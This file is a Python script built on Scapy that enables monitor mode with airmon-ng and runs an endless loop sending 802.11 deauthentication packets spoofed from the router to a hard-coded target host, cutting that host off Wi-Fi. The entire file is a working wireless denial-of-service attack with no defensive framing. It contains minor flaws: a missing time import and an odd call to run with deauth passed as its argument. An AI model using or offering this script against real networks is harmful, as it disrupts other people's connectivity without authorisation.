from scapy.all import *
from scapy.layers.dot11 import *
import net_tools as nt
import os

def init(host_socket):
    pass

def run(cmd):
    target_mac = nt.get_mac_address("10.10.26.67")
    router_mac = nt.get_router_mac()
    os.system("sudo airmon-ng start wlan0")
    while True:

        deauth(target_mac, router_mac )
        time.sleep(5)
    os.system("sudo airmon-ng stop wlan0")


def deauth(target_mac, gateway_mac):
    print("Deauthing...")
    packet = RadioTap() / Dot11(addr1=target_mac,
                                addr2=gateway_mac,
                                addr3=gateway_mac) / Dot11Deauth(reason=7)
    sendp(packet, inter=0.01,
          count=100, iface='wlan0',
          verbose=1)

run(deauth)